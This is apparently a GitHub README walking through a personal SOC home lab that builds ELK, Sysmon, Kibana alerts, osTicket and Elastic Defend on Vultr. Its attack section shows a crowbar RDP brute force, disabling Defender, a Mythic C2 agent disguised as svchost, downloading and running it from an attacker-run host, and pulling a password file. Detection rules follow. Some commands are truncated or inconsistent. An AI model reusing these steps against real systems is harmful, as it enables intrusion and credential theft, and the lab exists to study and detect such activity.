# SOC Analyst Project

## Description
ELK Stack...

## Languages and Utilities Used
- **Elasticsearch** 
- **Kibana** 
- **Powershell**

## Environments Used 
- **VULTR VPC 2.0** 
- **Ubuntu LTS 22.04** 
- **Windows Server 2022**

## Network Diagram:
![image alt](https://i.imgur.com/Oc04Y2R.png)

## Project Walk-through:
*Note: For the process of signing up to services, please follow the service website's directive.*  
The cloud provider we will use for this project is VULTR.  
Let’s begin:

### 1. Create a Virtual Private Cloud 2.0 network on VULTR.
- **Quick Explanation**: A VPC is a networking service that offers improved security, scalability, and performance, allowing users to create isolated, customizable cloud environments with advanced networking features.  
- Set the network location.
- Configure the IPv4 range. *You can decide to do this manually or let VULTR set it automatically.*
- Name your Network.
- Deploy a new server. Location should be the same as the VPC.  
  For this project, we will be using:
  - Ubuntu 22.04 LTS X64  
  - 80GB GB NVMe4 vCPUs  
  - Memory: 16GB  
  - Bandwidth: 6TB  
  - Select: VPC 2.0  
  - *Establish your own IP*

### 2. Deploy the Server
- Set your host name and server label (they should be the same).
- Deploy your server instance.
- Click the **View Console** option in VULTR to see if the instance is ready to connect via SSH.

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-19%20002344.png)

### 3. Use SSH via PowerShell
*Note: `<>` in this write-up is a placeholder, do not include in any of your commands.*

1. Start PowerShell with Administrative Privileges.
2. Type: `ssh root@<IP>`
3. Press ENTER.
4. Type "yes" to accept.
5. Paste the password given for your VULTR instance (password will not be visible when pasting). Press ENTER.

### 4. Update Repositories
- Input command: `apt-get update && apt-get update`

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-19%20002350.png)

### 5. Download and Install Elasticsearch
- Go to [https://www.elastic.co/downloads/elasticsearch](https://www.elastic.co/downloads/elasticsearch).
- Select: `deb x86_64` and copy the address link.
- Go back to PowerShell.
- Input command: `wget <paste elasticsearch address link>`
- Install Elasticsearch:
  - Input command: `dpkg -i elasticsearch` (Use TAB to auto-complete).

### 6. Save Elasticsearch Security Info
- Open your Notepad and save the “security auto configuration info.”
- *The superuser info is saved in this file.*

### 7. Change Directories
- Use: `cd /etc/elasticsearch/`
- Check the contents of the directory: `ls -a`.

### 8. Modify `elasticsearch.yml` File
- Input: `nano elasticsearch.yml`.
- Remove the `#` (comment) for `network.host: <localhost>`.
- Paste your public IP.
- Remove the `#` for the port.
- Close nano by pressing `ctrl + x`, then type `yes`, and press ENTER to save.

### 9. Implement Security: Firewall
- Go to VULTR.
- Navigate to the **Network** tab.
- Go to the **Firewall** tab.
- Add a firewall group.
- Change the source to: **My IP**, and add a rule.

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-19%20004751.png)

### 10. Start Elasticsearch Service
- Input: 
  ```bash
  systemctl daemon-reload
  systemctl enable elasticsearch.service
  systemctl start elasticsearch.service
# Kibana Installation and Configuration
 **Note: Kibana Setup (This step is more technical, if you do not follow each step correctly, troubleshooting will become vastly more difficult, contact me directly for support)**


### 1. Download Kibana

- Visit [elastic.co/downloads/kibana](https://elastic.co/downloads/kibana).

### 2. Choose Platform
For this project we are using:
- DEB x86_64
- Copy the path (copy link address)

### 3. Create a New PowerShell Window
- Run PowerShell with administrative privileges.
- Input: `ssh root@`
  *You are going to SSH into your VULTR instance.*

### 4. List Directory Contents
- Input: `ls -a`
  - *Notice the `.deb` file.*

### 5. Install Kibana
- Input: `dpkg -i kibana-8.15.1-amd64.deb`

### 6. Modify Configuration File
- Open nano.
- Input: `nano /etc/kibana/kibana.yml`
- Remove the `#` (comment) from the `server.port` and `server.host`.
  - *Important: For the server host, enter the VULTR IP of your instance. Leave the port as 5601.*

### 7. Update Kibana Repositories
- Run the following commands:
  - `systemctl daemon-reload`
  - `systemctl enable kibana.service`
  - `systemctl start kibana.service`
  - `systemctl status kibana.service`
  - *Kibana should have the status of: active.*

### 8. Generate Elasticsearch Enrollment Token for Kibana
- Change directories:
  - Input: `cd /usr/share/elasticsearch/bin`
- Generate token:
  - Input: `./elasticsearch-create-enrollment-token –scope kibana`
- Save the token generated in Notepad.
  - *Troubleshooting: If you get a “Connection timeout,” it’s most likely due to firewall rules.*

### 9. Configure Firewall in VULTR
- Go to VULTR.
  - Navigate to the **Network** tab.
  - Go to **Firewall**.
  - Accept **TCP**, Range: **1-65535**, Source: **My IP**.

### 10. Configure Firewall Rule on Ubuntu VM
- Input: `cd /` (to navigate to the home directory)
- Input: `ufw allow 5601` (this command allows port 5601 to communicate through the firewall)

### 11. Verify Kibana User Code
- Change directories:
  - Input: `cd /usr/share/kibana/bin`
- Execute the binary file:
  - Input: `./kibana-verification-code` (Use TAB for autocomplete)
  - *A user code will be generated.*

---

# Windows Server 2022 Deployment

### 1. Deploy the New Instance
- Settings for this project:
  - **Cloud Compute**: Shared CPU
  - **Location**: Same as other instances
  - **Image**: Windows Standard 2022 x64
  - **Storage**: 55 GB SSD
  - **Memory**: 2 GB
  - **Cores**: 1 vCPU
  - **Bandwidth**: 2TB

### 2. Start the VM
- Create the host name and server name.
- Click **Console** to determine when the VM is fully installed and running.
- Start the VM.

### 3. Connect Remotely via RDP
- Copy the IP of the Windows Server.
- Open **RDP** on a VM or local computer.
- Paste the IP into **Computer** and it will ask for the password. Connect.

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-19%20002407.png)

<br />
<br />

  

  

# Elastic Agent & Fleet Server Setup

### 1. Deploy a New Instance on VULTR
- Settings for this project:
  - **Optimized Cloud Compute**: Dedicated CPU
  - **Location**: Same as before
  - **Image**: Ubuntu 22.04 LTS x64
  - **Storage**: 30 GB NVMe
  - **Memory**: 4 GB
  - **Cores**: 1 vCPU
  - **Bandwidth**: 4TB

### 2. Log in to Public IP via Port 5601
- Kibana runs on port 5601.
- Fleet Server uses port 8220.

### 3. SSH into Fleet Server
- Input: `ssh root@ip`
  - *Add a firewall rule to the ELK stack VM to allow Fleet to access.*

### 4. Install Fleet Server
- Input the curl command from **Install Fleet Server to Centralized Host**:
  ```bash
  curl -X POST --fleet-server-port=8220

5\. Connect to ELK VM via SSH:

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-19%20002415.png)

## Sysmon Installation and Configuration for Log Telemetry

**Purpose:** Sysmon will be installed to monitor and capture telemetry for log creation. Use the process GUID to correlate events and capture the following:
- Source and destination IPs
- Ports
- Processes

### Event ID Descriptions:

- **#1**: Process Creation (Tracks activity of file hash)
- **#3**: Network Connections (Tracks source and destination IPs/ports)
- **#6**: Driver Loaded
- **#7**: Image Loaded
- **#8**: Create Remote Thread  
  *(Process injection—commonly used by attackers for code injection)*
- **#10**: Process Access to Local Security Authority (Lsass.exe)  
  *(Attackers may tamper with Lsass.exe to steal credentials and move laterally)*
- **#22**: DNS Query  
  *(Used to detect Indicators of Compromise (IOCs) on an endpoint)*

---

### Install and Setup Sysmon on Windows VM


1. Use the Remote Desktop Protocol (RDP) to connect to the server.
   - Enter the IP address of your Vultr Windows 2022 Server
   - Username: `administrator`
   - Password: copy from Vultr
![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-27%20012735.png)


2. Open Microsoft Edge
   - Search on Google: “sysmon”
   - Download Sysmon from the Microsoft website
   - Extract the contents of the downloaded file “Sysmon”
   - Search on Google: “sysmon olaf config”

3. Go to the GitHub link
   - Find the XML link and download the raw configuration file
   - Download to the extracted Sysmon folder
   - Copy the location of the downloaded XML file to the Sysmon folder

4. Open PowerShell, run as administrator (VM)
   - Enter: `cd` and paste the source location of the XML file
   - Enter: `dir` (you should see the same directory as the Sysmon binary and configuration file)

5. Open Event Viewer and Services from your search bar
   - You will not see Sysmon running yet

6. Return to PowerShell to install Sysmon:
   - Enter: `.\sysmon64.exe -i sysmonconfig.xml`
   - Install

7. Refresh Event Viewer and Services  
   Now, Sysmon should be a running process.

### 1. Login to Elasticsearch
- Go to: `http://ipaddress:5601`
- Add integrations:
  - Search: “custom windows event log package”
  - Add and configure:
    - Name
    - Description

### 2. RDP to Windows Server
- Open **Event Viewer**
- Select **Sysmon Event Log**
- Go to **Properties**:
  - Copy the **Channel Name**
  - Paste it into Elasticsearch under **Channel Name**

### 3. Add Channel Name to Existing Hosts in Elasticsearch
- Set **Agent Policy** to `MYDFIR-Windows-Policy`
- Save and deploy the changes.
![imagge alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-28%20131654.png)
### 4. Add Another Custom Windows Event Log Package
- Configure the integration:
  - Name
  - Description

### 5. Back to Windows Server
- In **Event Viewer**, select **Windows Defender – Operational**
- Ingest the following Event IDs:
  - **1116, 1117** (Malware Detection/Antivirus Error Codes)
  - **5001** (Real Time Protection is Disabled)

### 6. Add Channel Name for Windows Defender
- In the **custom windows event log package**, configure the integration:
  - Add the channel name for Windows Defender
  - In **Advanced** settings, specify Event IDs:
    - **1116, 1117, 5001**
  - Set **Agent Policy** to `MYDFIR-Windows-Policy`
  - Save and deploy the changes.
![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-28%20134456.png)
### 7. Go to Vultr
- Add a firewall rule:
  - Accept **TCP** traffic on port **9200**
  - Add the rule

*At this point, you will be able to see CPU and memory details in the Agent's dashboard in Elasticsearch.*
![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-28%20134636.png)
### 8. Discover Logs in Elasticsearch
- Navigate to **Discover** in Kibana.
- Search for logs with: `winlog.event_id: 1`
*Now when a log is expanded you will see that Windows Sysmon providing logs to elasticsearch.
![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-09-28%20140708.png)

# Ubuntu Server 24.02 Installation

1. Go to Vultr
   - Products
   - Choose Image
   - Choose Location
   - Ubuntu 24.02 LTS x64
   - 1 vCPU
   - 1024.00 MB
   - 25 GB SSD
2. Open PowerShell
   - ssh root@ipaddress
   - Copy password from Vultr
   - Paste password
   - Update repositories:
     apt-get update && apt-get upgrade -y

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-01%20121632.png)

3. Change directories:
   cd /var/log
   ls

4. Access authentication logs:
   cat auth.log
   *you can see failed auth attempts with:*
   grep -i failed auth.log | grep -i root

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-01%20145114.png)

---

# Install Elastic Agent on Ubuntu

1. Go to Elasticsearch GUI
   - Fleet
   - Agent Policy
     - New policy: MYDFIR-Linux-Policy
   - Add agent
   - Select Linux policy
   - Enroll in Fleet
   - Linux Tar (copy the command)

2. PowerShell:
   - Home directory: cd ~
   - Paste command
   - Add --insecure to sudo command (up arrow twice)
   *You will now be able to see logs from the Linux server on your Elasticsearch.*

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-01%20131947.png)

---

# Create Alerts and Dashboards in Kibana

1. Open Elasticsearch, let's create an alert:
   - Discover
   - Search for:
     system.auth.ssh.event: * and agent.name: "MYDFIR-Linux-Miguel" and system.auth.ssh.event : "Failed"

2. Click on Alerts:
   - Create search threshold rule
   - Name
   - Define your query
   - Save the alert
   *You will now have a saved search when you click on the hamburger icon on the top left.*

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-01%20140254.png)

3. Go to Maps:
   - Paste in the search query:
     system.auth.ssh.event: * and agent.name: "MYDFIR-Linux-Miguel" and system.auth.ssh.event : "Failed"
   - Add layer
     - Choropleth layer (shades layer)
     - Administrative boundaries from the Elastic Maps service
     - World countries
     - Join field: ISO 3166-1 alpha-2 code
     - Data view should be the same as the one from your search
     - Statistics source: join field = source.geo.country.iso_code
     - Save map: SSH Failed Authentication + New dashboard
   *You can now have a visual of the failed authentication attempts.*

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-01%20142118.png)

4. Save the Dashboard:
   - Name: MYDFIR-Authentication-Activity

5. Duplicate the map:
   - Change the name to SSH Successful Authentication
   - Change the settings: go to query and change “Failed” to “Accepted”

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-01%20142734.png)

6. Save


*Heres a map of 2 servers with a choropleth layer, this shows you how many attempts your servers can and will get from malicious actors. 
![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-01%20175621.png)

## Network Diagram:
<p align="center">
  <img src="https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-07%20174522.png" alt="image alt">
</p>

# Setup Mythic Server and Agent

1. Go to Vultr to Create a VM to use with Mythic.
   - Deploy Instance
   - Cloud Compute – Shared CPU
   - Location
   - Ubuntu 22.04 LTS x64
   - Specs: 80GB SSD 2 vCPUs 4GB 80GB SSD 3 TB
   - Enter Hostname
   - Deploy

2. Install Kali Linux on VMWare
   *if you need help with this I will provide a link to how to install Kali on a Windows OS.*
   (https://www.stationx.net/how-to-install-kali-linux-on-vmware/) by Richard Dezso

3. Now SSH with Powershell and install Mythic
   - Go to powershell
     - Input: `ssh root@ipaddress` (copy the ipaddress and password from your Vultr VM)
     - Update repositories  
       input: `apt-get update && apt-get upgrade -y`
   - Install Docker Compose  
     Input: `apt install docker-compose`
   - Install make  
     Input: `apt install make`
   - Clone the Repository  
     Input: `git clone https://github.com/its-a-feature/Mythic`
   - Let's check what files we have:  
     Input: `ls`  
     Input: `cd Mythic`
   - Now install Shell Script  
     Input: `./install_docker_ubuntu.sh`
   - Input: `systemctl restart docker`
   - Input: `systemctl status docker`  
     *Docker should now be active.*
   - Input: `make`

   - Let's start the Mythic CLI (Command Line)  
     Input: `./mythic-cli start`

4. Implement a Firewall rule to prevent others from connecting, only us.
   - Go to Vultr
     - Add a firewall rule for "My IP"
     - Add a firewall rule for "Custom" - *use Windows Server IP*
     - Add a firewall rule for "Custom" - *use Linux SSH Server IP*  
     - Go to Mythic server in Vultr
       - Firewall
       - Select the Mythic firewall we just created
       - Update firewall group

5. Log into Mythic Web GUI
   - Copy Mythic IP address and paste in web browser  
     Input: `ipaddress:7443` *add an 's' for https in your URL or it will return an error 400*  
     *The password will be in the environment variable in Powershell.*  
     Input: `ls -lah`  
     *(env is a hidden file, configuration file)*  
     Input: `cat .env`  
     - Find the password for `MYTHIC_ADMIN_PASSWORD=`  
     - Copy the password

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-07%20191718.png)


   - Now at the login prompt:
     - Input: `mythic_admin`
     - Paste password  
     *You will now be able to make changes and mess around with the Mythic GUI.*

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-07%20191823.png)


## Setup Mythic Server and Agent

**Objective: Perform a brute force attack and establish a C2 (Command and Control) session.**  
Tools: Use Mythic C2 and Kali Linux for the attack on a Windows server.  

Phases of the attack:
- Phase 1: Perform a brute force attack to gain unauthorized access to the Windows server.
- Phase 2: Run discovery commands to gather information and evade defenses.
- Phase 3: Execute commands on the compromised system using Mythic C2.
- Phase 4: Generate a Mythic agent, then use PowerShell to download the agent onto the Windows server.
- Phase 5: Establish a C2 connection to the Mythic server and use it to retrieve a password.

## Phase 1:
1. Use RDP to connect to the Windows Server
   - Create a text file named: `passwords.txt` in the Documents folder.
   - Change the password for the user to the same one in the text file.
     *For this project, we needed to edit the group policy of local accounts.*

2. Log in to your Kali Linux VM
   - Open a command prompt
   - Use: `cd /usr/share/wordlists`
   - Use: `ls`
   - Unzip the file named `rockyou.txt.gz`
     - Use: `sudo gunzip rockyou.txt.gz`
     - Enter password
   - Let's look in the file  
     - Use: `cat rockyou.txt.gz | less`  
     *You can see the most common passwords.*


![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143410.png)



   - Use: `head – 50 rockyou.txt > /home/kali/mydfir-wordlist.txt`
     *Only use the first 50 passwords in the file.*
   - Add the password you used for your Windows Server to the list  
     - Use: `nano mydfir-wordlist.txt`  
     *Enter your password*  
     - `Ctrl x`, `Ctrl y`
   *This wordlist will be used to brute force the Windows Server.*

   - Update the repositories
     - Use: `sudo apt-get update && sudo apt-get upgrade -y`
   - To fix repositories: 
     - Use: `sudo apt install gnupg`

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143425.png)

   - Install crowbar  
     Use: `sudo apt-get install -y crowbar`

   - Check to see if crowbar successfully installed  
     Use: `crowbar -h`

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143435.png)



     
   - Create a new file  
     *Copy the Windows server IP address from Vultr.*  
     Use: `nano target.txt`  
     - Input: `ip address from windows server, username`
       - `Ctrl x`, `Ctrl y`, `Enter`

   - Target VM  
     Use: `crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s (windows public address)/32`  
     *(`-b = rdp service, -u = user, -C = what you will try to authenticate with, -s = target IP address, /32 = only this IP address)*

   - Use the tool xfreerdp to connect to the Windows server  
     Use: `xfreerdp /u:Administrator /p:Winter2024! /v:144.202.56.135:3389`
   - You can see a FreeRDP window pop up  
     *You are now connected to the Windows server by using brute force with Kali Linux.*

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143459.png)

## Phase 2:

- Open a command prompt
  - Use: `whoami`, `ipconfig`, `net user administrator` *(adds administrator to admin privileges)*

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143512.png)

## Phase 3:

- Disable Windows Defender
  - In Windows security go to Virus & Threat protection
  - Turn off all settings
 
![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143520.png)

## Phase 4:

*Here is a link to the payloads available on Mythic:*  
https://mythicmeta.github.io/overview/agent_matrix.html

- Login to your Mythic Web GUI
- Now go to Powershell (Mythic Server)
- Add the Mythic agent Apollo  
  Use: `./mythic-cli install github https://github.com/MythicAgents/Apollo.git`

*You will now see Apollo in your Mythic GUI.*

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143538.png)

- Create a C2 profile  
  *Here is a list of C2 profiles:*  
  https://github.com/MythicC2Profiles

  - Go to Powershell (Mythic)  
    Use: `./mythic-cli install github https://github.com/MythicC2Profiles/http`

   ![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143550.png)

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143600.png)

- Create a new payload
  - Actions
  - Generate new payload
  - Windows
  - WinExe
  - Include every command
  - Include C2 profile
  - Callback host:  
    Use: `http://mythic public IP address`
    *Very important to remove the 's' from `https://`, this took me an hour of troubleshooting as it would not connect to an active callback in Phase 5.*
  - Callback port: 80
  - Payload name: `svchost-miguel.exe`
  - Description: Payload/Agent
  - Create payload
  - Download
    - Copy link address

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143607.png)

- Back on Powershell
  - Use: `pwd`
  - Use: `wget paste link address --no-check-certificate`
  - Use: `ls`  
    *Now you have a new file.*
  - Change the name of the file  
    Use: `mv filename svchost-miguel.exe`  
    Use: `ls`

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143630.png)

  - Create a directory  
    Use: `mkdir 1`  
    Use: `mv svc-miguel.exe 1/`  
    Use: `cd 1`  
    Use: `ls`
  - Firewall allow on port 9999  
    Use: `ufw allow 9999`  
    Use: `ufw allow 80`

  - Use a Python module for HTTP  
    Use: `python3 -m http.server 9999`

## Phase 5:

- Back in Kali (use Powershell, not the command prompt)  
  Use: `Invoke-WebRequest -Url http://mythic server IP address:9999/svchost-miguel.exe -OutFile “C:\Users\Public\Downloads\svchost-miguel.exe”`

  - Now let's see what's in Downloads  
    Use: `cd C:\Users\Public\Downloads`  
    Use: `dir`
  - Run svchost-miguel.exe  
    Use: `.\svchost-miguel.exe`  
    Use: `netstat`  
    *You should see svchost-mig
## Phase 6: Download the Password File

1. **Active Callback in Mythic**
    - After establishing an active callback from the target machine to the Mythic server, navigate to the active session in the Mythic Web GUI.

2. **Execute Download Command**
    - In the Mythic Web GUI, open the **Active Callback** tab.
    - In the command input field, use the following command to download the password file:
      ```bash
      download C:\Users\Administrator\Documents\passwords.txt
      ```

3. **View the Downloaded File**
    - Navigate to the **Downloads** section (represented by a paperclip icon) in the Mythic GUI.
    - You should now see the downloaded `passwords.txt` file listed there.
    - Click on the file to download it to your local machine for further analysis.

    **Screenshot** (*optional for documentation purposes*)

*You have successfully completed the process of retrieving the password file from the target machine using Mythic C2.* 

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143646.png)

![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/image/Screenshot%202024-10-08%20143655.png)
### Phase 6: Mythic C2 and Kibana Dashboards

**On Mythic in Active Callback:**

- Use: `download C:\Users\Administrator\Documents\passwords.txt`
- Under downloads (paperclick)
    - *You will see the file*

#### Create Alerts and Dashboards in Kibana for Mythic Telemetry

1. **Go to Elastic:**
    - **Discover**  
    - **New**
        - Query for binary: `svchost-miguel.exe`
        - Sort from old to new: You will see `2517`
        - File create from sysmon event.code 11  
        - Event code 1 = MD5 hash, to use for context
        - Input into search: `and event.code : 1`
        - *We have six documents*
        - Copy the SHA1 hash

2. **Go to virustotal.com/gui/home/search:**
    - No hashes in the database, as this is a new agent

3. **Winlog.event_data.OriginalFileName:** `Apollo.exe`

#### Let's make an alert to detect this:

- For this rule to trigger on process created:
    - In your notes save: `event.code :"1" and (winlog.event_data.Hashes: *2AD125CEC78F1462A9BF587BDD520C01F91D623B194F6A7C5794AE58C0DF5C13, IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744* or winlog.event_data.OriginalFileName : "Apollo.exe")`
    - Save your alert
    - Name: `Mythic-Apollo-Process-Create`

#### Create a new rule:

- **Security**
- **Custom Query**
    - Paste in the query we just searched for
    - **Required Fields:**
        - `timestamp`
        - `host.name`
        - `message`
        - `winlog.event_data.CommandLine`
        - `winlog.event_data.Image`
        - `winlog.event_data.ParentCommandLine`
        - `winlog.event_data.ParentImage`
        - `winlog.event_data.User`
        - `winlog.event_data.CurrentDirectory`

*Reason for this is to provide all the information we need for the next steps.*

- Name it: `MYDFIR-Mythic-C2-Apollo-Agent-Detected`
- Description: Rule detects potential C2 Mythic Apollo agent.
- Severity: Critical
- Create & Enable Rule

#### Dashboard Creation Panels:

a. **Event ID: 1** = Process Creates – Powershell, Cmd, rundll32  
    - `event.code: 1 and event.provider: Microsoft-Windows-Sysmon and (powershell or cmd or rundll32)`
b. **Event ID: 3** = Network Connections (External)  
    - Processes initiating outbound connections.
    - `event.code: 3 and event.provider: Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true`
c. **Event ID: 5001**  
    - `event.code: "5001" and event.provider : "Microsoft-Windows-Windows Defender"`
    - **Discover**
    - **Dashboards**
    - **Create Dashboard**
        - Create Visualization
        - Copy event 1 query
        - Use the table option
        - Copy over the field names
        - Format to your liking
    - Repeat the process for event 3 and 5001
    - Save dashboards as Suspicious Activity

#### Set up osTicket:

- Go to Vultr
    - Deploy a cloud compute – shared CPU
        - Windows Standard 2022
        - 55 GB SSD1 vCPU2 GB
        - 55 GB SSD2 TB
        - VPC 2.0
        - Save IP address `10.2.96.5`
        - Add a firewall
- RDP into the machine
    - Download XAMPP and go through the setup process
        - You will now see the control panel for XAMPP
    - Go to Windows Defender
        - Create an inbound rule to allow port 80/443
    - Go to XAMPP
        - Start Apache and MySQL service
        - Admin
            - phpMyAdmin
                - User accounts
                - Root (login information)
                - Change:
                    - Hostname to public IP
                    - Password, use text field: Winter2024
                - Go
    - Edit the properties in the configuration file
        - C: directory
        - Edit the properties file
            - Change the domain name to your public IP address
            - *This is the IP address from your VM*
            - Save

    - Go to phpMyAdmin file in the same XAMPP directory
        - Copy the file `config.inc.php` and paste/rename as backup at the end of the file
        - Change the IP address to your public IP address
            - /* Bind to the localhost ipv4 address and tcp */
        - Change the password to: Winter2024
    - To clear error with pma user (in phpMyAdmin)
        - Change the hostname to public IP address
        - Add the same password
    - Add the password for pma to the configuration file in `config.inc.php`
    - Go to phpMyAdmin

#### Now let's install osTicket:

- Download self-hosted
    - Free download
    - Extract the files downloaded
    - Go to htdocs under XAMPP
        - Default contents for the Apache server are stored at this location
        - Create a new directory
            - Folder: name it `osticket`
    - Open osTicket
        - Copy the 2 folders inside
            - `scripts/upload`
        - Paste in the directory we created inside of htdocs
    - Open Edge
        - Enter the public address `/osticket/upload`

- The configuration file is missing
    - Go to the upload folder
    - Remove “sample” from the file name

    - Go to phpMyAdmin
        - Create a database
            - New
            - Name it and create it
        - Home
        - User accounts
        - Root
        - Databases
        - Select the database to give it privileges
        - Check all

    - Go through the osTicket Basic Installation
        - Make sure the database is the same as the one created on your phpMyAdmin
        - Make sure the emails are different for the admin and system

- Now change the permissions to the `os-config`
    - Copy the path of where `os-config` is
    - Go to PowerShell admin privileges
        - `cd` paste path
        - Input: `icacls .\ost-config.php /reset`
    - Copy the URLs from osTicket (your osTicket URL, your staff control panel) into your notepad.

- Use the staff control panel

#### osTicket + ELK Integration:

- Go to osTicket
    - Manage
    - Add API key
    - Paste in your VPC 2.0 IP address
    - Select "Can create tickets"
    - Add key
    - Copy API key and save in your notepad

- RDP into your osTicket server
    - Control panel
    - Input: `ipconfig`
    - *You will see that one of your Ethernet instances has your public IP, but the other has a random IP.*
    - Go to your network
        - Change the adapter settings
        - Give it the VPC IP address

- SSH into your ELK server
    - PowerShell admin privileges
        - Ping your VPC
        - *It should work now*

- Now go to Elastic
    - **Management**
    - **Stack Management**
    - **Connectors**
    - **Webhook**
        - Name the connector
        - Input: `http://VPCipaddress/osticket/upload/api/tickets.xml`
        - No authentication
        - Add header
            - Key: `X-API-Key`
            - Value: Paste in your API key
        - Test: Go to this page and copy the XML Payload Example
            - https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md
        - Test was successful if you see this on your edit connector panel
    - To make sure it worked:
        - Go to osTicket
        - Agent panel
        - You should see the ticket now. Success

#### Deploying EDR:

- Go to Elastic Defend
    - **Management**
    - **Integrations**
    - **Elastic Defend**
    - Add
    - Name
    - Traditional endpoints for the type of environment
    - Complete EDR
    - Add to existing host
        - Windows-policy (your fleet server)
    - Done
    - **Security**
    - **Manage**
    - **Endpoints**
    - **Actions**

Malicious Files:  
- In your Windows server, you can try to open a suspicious file, and it will be blocked and recorded on your EDR. You will now see it in Elasticsearch.
- You can change the response as well to isolate the host.

*Note: Everything in this lab will be destroyed as I am finished with this project, so no point in trying to connect to my environment.*

---

### Summary:

From this project I was able to:

1. Set up my own ELK instance
2. Created network diagrams for my environment and attack setup
3. Set up 2 servers (Linux SSH and Windows RDP)
4. Installed multiple
   - Kibana
   - Elasticsearch
   - Filebeat
   - Winlogbeat
5. **Sent alerts and queries directly from Mythic C2**


